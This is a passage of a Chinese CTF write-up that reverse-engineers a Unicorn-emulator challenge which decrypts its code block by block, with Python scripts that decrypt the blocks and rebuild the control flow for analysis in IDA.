title="image-20210613213709484"><h2 id="2-main-函数分析"><a href="#2-main-函数分析" class="headerlink" title="2. main 函数分析"></a>2. main 函数分析</h2><p>2.1 创建虚拟机</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">uc_open(<span class="hljs-number">4u</span>, <span class="hljs-number">8</span>, &amp;v14);                         <span class="hljs-comment">// UC_ARCH_X86, UC_MODE_64</span><br></code></pre></td></tr></table></figure><p>2.2 复制代码到虚拟机的 0x1000 地址</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uc_mem_write</span>(v<span class="hljs-number">14</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1000</span>LL, &amp;code, <span class="hljs-number">0</span>x<span class="hljs-number">1027</span>LL);<br></code></pre></td></tr></table></figure><p>2.3 设置回调</p><p>Unicorn 支持很多种回调类型，当 Unicorn 运行的代码满足特定的条件时，将触发对应的回调。</p><p>在回调中可以对虚拟机中环境上下文操作，类似调试器的调试回调。 </p><p>本题借助 Unicorn 指令回调，实现指令即时解密，执行后重新加密，打乱控制流。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 虚拟机输入接口，虚拟机代码中的 in 指令</span><br>uc_hook_add(v14, &amp;trace, <span class="hljs-number">2</span>, input + <span class="hljs-number">1</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0xDA</span>u);<span class="hljs-comment">// 2 == UC_HOOK_INSN</span><br><span class="hljs-comment">// 虚拟机输出接口，虚拟机中代码中的 out 指令处理</span><br>uc_hook_add(v14, &amp;trace, <span class="hljs-number">2</span>, output, <span class="hljs-number">0LL</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0x1F4</span>u);<span class="hljs-comment">// 2 = UC_HOOK_INSN</span><br><span class="hljs-comment">// 虚拟机中 syscall 指令处理，设置 rax 寄存器的值为 time(0)</span><br>uc_hook_add(v14, &amp;trace, <span class="hljs-number">2</span>, syscall_time, <span class="hljs-number">0LL</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0x2BB</span>u);<span class="hljs-comment">// 2 = UC_HOOK_INSN</span><br><span class="hljs-comment">// 虚拟机中 fs 内存访问处理，改变 fs:0 的值，关键算法部分很重要</span><br>uc_hook_add(v14, &amp;trace, <span class="hljs-number">1024</span>, changeKey, <span class="hljs-number">0LL</span>, <span class="hljs-number">0x66660000</span>LL, <span class="hljs-number">0x66661000</span>LL, v4);<span class="hljs-comment">// UC_HOOK_MEM_READ</span><br><span class="hljs-comment">// 代码解密回调</span><br>uc_hook_add(v14, &amp;trace, <span class="hljs-number">8</span>, decrypt, &amp;v21, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, v5);<span class="hljs-comment">// UC_HOOK_BLOCK</span><br><span class="hljs-comment">// 代码控制流控制回调1</span><br>uc_hook_add(v14, &amp;trace, <span class="hljs-number">0x4000</span>,  ControlFlow1, &amp;v21, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, v6);<span class="hljs-comment">// UC_HOOK_INSN_INVALID</span><br><span class="hljs-comment">// 代码控制流控制回调2</span><br>uc_hook_add(v14, &amp;trace, <span class="hljs-number">4</span>,  ControlFlow2, &amp;v21, <span class="hljs-number">0x10A3</span>LL, <span class="hljs-number">0x10A4</span>LL, v7);<span class="hljs-comment">// UC_HOOK_CODE</span><br></code></pre></td></tr></table></figure><p>注意控制流有两个控制回调，第二个控制回调只在 0x10A3 地址处有效，就是特殊处理的地址。</p><h2 id="3-代码解密分析"><a href="#3-代码解密分析" class="headerlink" title="3. 代码解密分析"></a>3. 代码解密分析</h2><p>代码解密的主要逻辑在 decrypt 函数，该函数解密当前即将执行的基本块，加密上一个执行完的基本块</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++">v9 = miniDec(lastKey, entry_rip);<br><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">85</span>; ++i )<br>&#123;<br>  <span class="hljs-keyword">if</span> ( v9 == *&amp;size_table[<span class="hljs-number">8</span> * i] )<br>  &#123;<br>    size[<span class="hljs-number">0</span>] = *&amp;size_table[<span class="hljs-number">8</span> * i + <span class="hljs-number">4</span>];        <span class="hljs-comment">// getlen</span><br>    v12 = <span class="hljs-built_in">malloc</span>(size[<span class="hljs-number">0</span>]);<br>    uc_mem_read(v5, addr, v12, size[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; size[<span class="hljs-number">0</span>] &gt; j; ++j )<br>      ;<br>    dec1(v12, size[<span class="hljs-number">0</span>], lastKey);<br>    uc_mem_write(v5, addr, v12, size[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; size[<span class="hljs-number">0</span>] &gt; k; ++k )<br>      ;<br>    <span class="hljs-built_in">free</span>(v12);<br>    *(*&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">4LL</span>) = addr;<br>    *(*&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">12LL</span>) = **&amp;size[<span class="hljs-number">1</span>];<br>    *(*&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">8LL</span>) = size[<span class="hljs-number">0</span>];<br>    *(*&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">16LL</span>) = addr;<br>    uc_reg_write(v5, <span class="hljs-number">41</span>, &amp;addr);              <span class="hljs-comment">// UC_X86_REG_RIP</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>基本块密钥用 miniDec 函数计算，参数为上一个基本块的入口密钥 lastKey 与当前基本块入口 rip, minidec 函数如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">miniDec</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">int</span> a2)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> a2 ^ a1 ^ (a2 * a1) ^ (a1 + a2);<br>&#125;<br></code></pre></td></tr></table></figure><p>size_table 是一个数组，该数组保存了基本块密钥与基本块大小的关系，元素结构如下</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs processing">dd <span class="hljs-built_in">key</span><br>dd <span class="hljs-built_in">size</span><br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">size_table = [<span class="hljs-number">0x02F73020</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x09D3473A</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x0EF87B55</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x147CB028</span>, <span class="hljs-number">0x00000023</span>, <span class="hljs-number">0x15F833AA</span>, <span class="hljs-number">0x00000030</span>, <span class="hljs-number">0x17086780</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0x1733A9D4</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x17D61EE8</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x1D52F19E</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x1F732DE0</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x1FBECFAD</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0x245BD7C8</span>, <span class="hljs-number">0x00000055</span>, <span class="hljs-number">0x25E7ABEE</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x2882C190</span>, <span class="hljs-number">0x000000A2</span>, <span class="hljs-number">0x2A2084A0</span>, <span class="hljs-number">0x00000075</span>, <span class="hljs-number">0x326AA6AE</span>, <span class="hljs-number">0x00000036</span>, <span class="hljs-number">0x33074A36</span>, <span class="hljs-number">0x00000024</span>, <span class="hljs-number">0x3440BD69</span>, <span class="hljs-number">0x0000002C</span>, <span class="hljs-number">0x362A1FC3</span>, <span class="hljs-number">0x0000002C</span>, <span class="hljs-number">0x3C0450D0</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x3CB575FD</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x41B3B26E</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0x46005120</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x465A72CF</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x492145A0</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x49AA4CE0</span>, <span class="hljs-number">0x0000002D</span>, <span class="hljs-number">0x4BD63647</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0x4BF84A87</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x4D102445</span>, <span class="hljs-number">0x00000033</span>, <span class="hljs-number">0x4D4D3C55</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0x53723232</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0x5809B5CB</span>, <span class="hljs-number">0x000000A2</span>, <span class="hljs-number">0x5B12FFCE</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x5B1F3000</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x5D9FBD20</span>, <span class="hljs-number">0x00000027</span>, <span class="hljs-number">0x6219EED9</span>, <span class="hljs-number">0x0000008A</span>, <span class="hljs-number">0x65D82D17</span>, <span class="hljs-number">0x0000004C</span>, <span class="hljs-number">0x67F5671A</span>, <span class="hljs-number">0x00000063</span>, <span class="hljs-number">0x6CE2CBC1</span>, <span class="hljs-number">0x00000033</span>, <span class="hljs-number">0x718A739C</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x71A62DD7</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x7693A1F6</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x7A473FB0</span>, <span class="hljs-number">0x00000047</span>, <span class="hljs-number">0x7AEFEDDC</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x7AF2CF90</span>, <span class="hljs-number">0x0000004F</span>, <span class="hljs-number">0x7BE0B8B0</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0x80EB3E88</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0x8213506A</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x82468114</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x86B872A2</span>, <span class="hljs-number">0x0000001C</span>, <span class="hljs-number">0x87FBD296</span>, <span class="hljs-number">0x00000019</span>, <span class="hljs-number">0x88719339</span>, <span class="hljs-number">0x00000016</span>, <span class="hljs-number">0x89E2630A</span>, <span class="hljs-number">0x00000024</span>, <span class="hljs-number">0x8CB6536E</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0x92316E00</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x9415A51E</span>, <span class="hljs-number">0x0000004F</span>, <span class="hljs-number">0x94D658E0</span>, <span class="hljs-number">0x0000002B</span>, <span class="hljs-number">0x97E8DFCD</span>, <span class="hljs-number">0x00000036</span>, <span class="hljs-number">0x992E3874</span>, <span class="hljs-number">0x0000002A</span>, <span class="hljs-number">0x9B06958D</span>, <span class="hljs-number">0x00000030</span>, <span class="hljs-number">0x9B36B480</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0xA03CEFAD</span>, <span class="hljs-number">0x0000005A</span>, <span class="hljs-number">0xA39F47E6</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0xA946DEC4</span>, <span class="hljs-number">0x000000B4</span>, <span class="hljs-number">0xAE6173DC</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0xB044A68D</span>, <span class="hljs-number">0x0000008C</span>, <span class="hljs-number">0xB29E36A8</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0xB82781F4</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0xC14DFAF8</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xC3F42E20</span>, <span class="hljs-number">0x0000001E</span>, <span class="hljs-number">0xC5E0065E</span>, <span class="hljs-number">0x00000067</span>, <span class="hljs-number">0xCAD68B21</span>, <span class="hljs-number">0x00000039</span>, <span class="hljs-number">0xCBF29AC7</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xCE8729BC</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0xD2A85A94</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0xD34FA4F3</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xD64611B0</span>, <span class="hljs-number">0x00000058</span>, <span class="hljs-number">0xD814FD56</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0xDD386A80</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0xDE82DFAC</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xEC68D16F</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0xEEDE845B</span>, <span class="hljs-number">0x0000003F</span>, <span class="hljs-number">0xF235F260</span>, <span class="hljs-number">0x0000008D</span>, <span class="hljs-number">0xF9AA1F0B</span>, <span class="hljs-number">0x00000087</span>, <span class="hljs-number">0xFC200887</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xFED657A3</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x00000000</span>]<br></code></pre></td></tr></table></figure><p>奇数下标数据为key，偶数为基本块字节的长度。</p><p>用 python 实现基本块解密函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuck</span>(<span class="hljs-params">prev_key, rip</span>):</span><br>    <span class="hljs-keyword">return</span> rip ^ prev_key ^ ((rip * prev_key) &amp; <span class="hljs-number">0xffffffff</span>) ^ (prev_key + rip)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deXor</span>(<span class="hljs-params">data, key</span>):</span><br>    key = p32(key)<br>    data = <span class="hljs-built_in">bytearray</span>(data)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>        data[i] ^=  key[i % <span class="hljs-number">4</span>]<br>    <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt_block</span>(<span class="hljs-params">key, rip</span>):</span><br>    key2 = fuck(key, rip)<br>    blockSize = get_size(key2)<br>    <span class="hljs-keyword">if</span> blockSize <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        print(<span class="hljs-string">&quot;Not found1: rip:%x key:%x&quot;</span> % (rip, key2))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br>    offset = rip - <span class="hljs-number">0x1000</span><br>    code_data = code_bin[offset: offset + blockSize]<br>    code_data = deXor(code_data, key)<br>    next_rip = rip + blockSize - <span class="hljs-number">2</span><br>    key2 = fuck(key, next_rip)<br>    jmps = get_jmps(key2)<br>    <span class="hljs-keyword">return</span> code_data, jmps, next_rip<br></code></pre></td></tr></table></figure><p>这里的部分代码还涉及控制流重建，后面会提到。</p><h2 id="4-控制流分析"><a href="#4-控制流分析" class="headerlink" title="4. 控制流分析"></a>4. 控制流分析</h2><p>ControlFlow1 回调，执行到无效指令会被调用，用于切换程序中的控制流。</p><p>该题用 <code>3f 0f </code>作为基本块的结尾（无效指令）触发 ControlFlow1 回调，切换控制流。</p><p>ControlFlow1 回调函数根据结尾 rip 与 当前基本块的 key 计算另外一个 key，用于索引当前基本块的后继基本块的信息。</p><img src="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/image-20210613220614232.png" class="" title="image-20210613220614232"><p>flowInfo 是一个数组，每一个元素有如下5个字段</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dd</span> key<br><span class="hljs-attribute">dd</span> zf_<span class="hljs-number">0</span>_jmp  当基本块结尾 zf 标志寄存器为 <span class="hljs-number">0</span> 的跳转偏移，下面同理<br><span class="hljs-attribute">dd</span> zf_<span class="hljs-number">0</span>_key<br><span class="hljs-attribute">dd</span> zf_<span class="hljs-number">1</span>_jmp<br><span class="hljs-attribute">dd</span> zf_<span class="hljs-number">1</span>_key<br></code></pre></td></tr></table></figure><p>根据 zf 标志位跳转</p><img src="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/image-20210613222926881.png" class="" title="image-20210613222926881"><p>注意 v9 保存的是上一个基本块的 key，此处做的 += 运算，即上一个基本块的 key 与 下一个基本块的 key 有关联。</p><p>由此可见，基本块的 key 与控制流的路径有关！写解密脚本的时候要考虑路径问题。</p><p>另外，当虚拟机中程序运行到 0x10A3 时将调整控制流并更改 key</p><img src="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/image-20210614135822676.png" class="" title="image-20210614135822676"><p>解密后的基本块，很多都是以读取 fs 寄存器并判断结尾</p><img src="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/image-20210614140832827.png" class="" title="image-20210614140832827"><p>r15 的值来源于 fs:xxx ，最后再与 fs:xxx 内存的值比较，很明显最后的 zf = 1。</p><p>其实并不是，这道题对 fs 寄存器指向的那段内存做了内存读回调，回调如下</p><img src="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/image-20210614141153126.png" class="" title="image-20210614141153126"><p>每次读取 fs 指向的内存，该内存的值都会被改写。所以 mov 与 cmp 对 fs 内存访问出的结果是不同的，自然 zf = 0，走 zf = 0 的分支。</p><p>在控制流重建的时候，需要考虑以读取 fs 内存结尾的基本块，将其看作是无条件跳转，而不是 jz/jnz。</p><h2 id="5-控制流重建"><a href="#5-控制流重建" class="headerlink" title="5. 控制流重建"></a>5. 控制流重建</h2><p>重建思路：</p><p>以 bfs 遍历顺序，从入口基本块开始解密，解密后再查询分支信息表获取后继基本块的相对偏移与key，最后将新基本块的信息加入到队列，等待分析。遍历时注意维护路径上的 key 累计值。</p><p>所有基本块解密完成后，可以得到每个基本块的后继基本块的相对偏移。</p><p>要在基本块的结尾插入跳转指令，这将改变代码布局，使得原始相对偏移不可用，所以我采取重编译来解决这个问题，重编译之前将原始基本块的入口地址作为基本的符号名，基本块结尾用 jmp/jz 等指令连接。</p><p>code.bin 文件时 dump 出来的原始 code 数据，输出 1.bin 可以直接在 ida 中反编译。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">from</span> capstone <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> keystone <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>fuckTable = [<span class="hljs-number">0x00412F5E</span>, <span class="hljs-number">0xFFFFFA22</span>, <span class="hljs-number">0x14252652</span>, <span class="hljs-number">0xFFFFF9AC</span>, <span class="hljs-number">0x66CEF8EC</span>, <span class="hljs-number">0x0251D934</span>, <span class="hljs-number">0x0000009F</span>, <span class="hljs-number">0xC56FBF59</span>, <span class="hljs-number">0xFFFFFF61</span>, <span class="hljs-number">0xAA4D5B7C</span>, <span class="hljs-number">0x02745896</span>, <span class="hljs-number">0xFFFFFB7F</span>, <span class="hljs-number">0x34B6D31E</span>, <span class="hljs-number">0xFFFFFBB0</span>, <span class="hljs-number">0x302CC828</span>, <span class="hljs-number">0x02AC5992</span>, <span class="hljs-number">0xFFFFF524</span>, <span class="hljs-number">0x67CC4064</span>, <span class="hljs-number">0xFFFFF483</span>, <span class="hljs-number">0x8A5D9B26</span>, <span class="hljs-number">0x046254D0</span>, <span class="hljs-number">0xFFFFFC37</span>, <span class="hljs-number">0x074AB936</span>, <span class="hljs-number">0xFFFFFC7F</span>, <span class="hljs-number">0xB8EA37F7</span>, <span class="hljs-number">0x0CACD9FE</span>, <span class="hljs-number">0x0000007F</span>, <span class="hljs-number">0x6112F222</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x47A72561</span>, <span class="hljs-number">0x0F0FE6EB</span>, <span class="hljs-number">0xFFFFFBAE</span>, <span class="hljs-number">0x0A1411E7</span>, <span class="hljs-number">0xFFFFFC85</span>, <span class="hljs-number">0x3BE88B46</span>, <span class="hljs-number">0x0FC59DC2</span>, <span class="hljs-number">0xFFFFF72F</span>, <span class="hljs-number">0x7D12A5EF</span>, <span class="hljs-number">0xFFFFF691</span>, <span class="hljs-number">0xE67393D6</span>, <span class="hljs-number">0x10B1EBCA</span>, <span class="hljs-number">0x000001CF</span>, <span class="hljs-number">0x473A1295</span>, <span class="hljs-number">0x0000022E</span>, <span class="hljs-number">0x7BC15385</span>, <span class="hljs-number">0x1565D41D</span>, <span class="hljs-number">0xFFFFFDC4</span>, <span class="hljs-number">0x05D337BE</span>, <span class="hljs-number">0xFFFFFE7E</span>, <span class="hljs-number">0xE12982E4</span>, <span class="hljs-number">0x18909E40</span>, <span class="hljs-number">0x000005EB</span>, <span class="hljs-number">0xAE2337AF</span>, <span class="hljs-number">0x000005B1</span>, <span class="hljs-number">0x8E0AB2ED</span>, <span class="hljs-number">0x1AE7593A</span>, <span class="hljs-number">0xFFFFF3BC</span>, <span class="hljs-number">0x23E9058D</span>, <span class="hljs-number">0xFFFFF40B</span>, <span class="hljs-number">0xDFA6CF3E</span>, <span class="hljs-number">0x1B47DA81</span>, <span class="hljs-number">0xFFFFF8C3</span>, <span class="hljs-number">0x349CC616</span>, <span class="hljs-number">0xFFFFF7E9</span>, <span class="hljs-number">0x70C290D0</span>, <span class="hljs-number">0x1D816435</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x43F999C9</span>, <span class="hljs-number">0xFFFFFFD8</span>, <span class="hljs-number">0xAB0BCA16</span>, <span class="hljs-number">0x1DACC905</span>, <span class="hljs-number">0xFFFFFF54</span>, <span class="hljs-number">0x5C129962</span>, <span class="hljs-number">0xFFFFFD06</span>, <span class="hljs-number">0xE4515A41</span>, <span class="hljs-number">0x1E03B13C</span>, <span class="hljs-number">0xFFFFFF80</span>, <span class="hljs-number">0x7E763806</span>, <span class="hljs-number">0xFFFFF36A</span>, <span class="hljs-number">0xA25F3D93</span>, <span class="hljs-number">0x22FEFC06</span>, <span class="hljs-number">0xFFFFFCDD</span>, <span class="hljs-number">0xB94E0C2F</span>, <span class="hljs-number">0xFFFFFCB6</span>, <span class="hljs-number">0xF023033D</span>, <span class="hljs-number">0x26B1E690</span>, <span class="hljs-number">0xFFFFFDAB</span>, <span class="hljs-number">0xD0C7ED0C</span>, <span class="hljs-number">0xFFFFFE9B</span>, <span class="hljs-number">0xD49872C6</span>, <span class="hljs-number">0x2A652084</span>, <span class="hljs-number">0x000001EA</span>, <span class="hljs-number">0xDF9B65EE</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x5CC5AB90</span>, <span class="hljs-number">0x2FBEBD25</span>, <span class="hljs-number">0x0000048F</span>, <span class="hljs-number">0x60A4E9F2</span>, <span class="hljs-number">0x000009AF</span>, <span class="hljs-number">0x42FE8B0D</span>, <span class="hljs-number">0x34F12D90</span>, <span class="hljs-number">0x000004C0</span>, <span class="hljs-number">0xF6257D94</span>, <span class="hljs-number">0x00000480</span>, <span class="hljs-number">0x5227DE21</span>, <span class="hljs-number">0x35F591D0</span>, <span class="hljs-number">0xFFFFFCA1</span>, <span 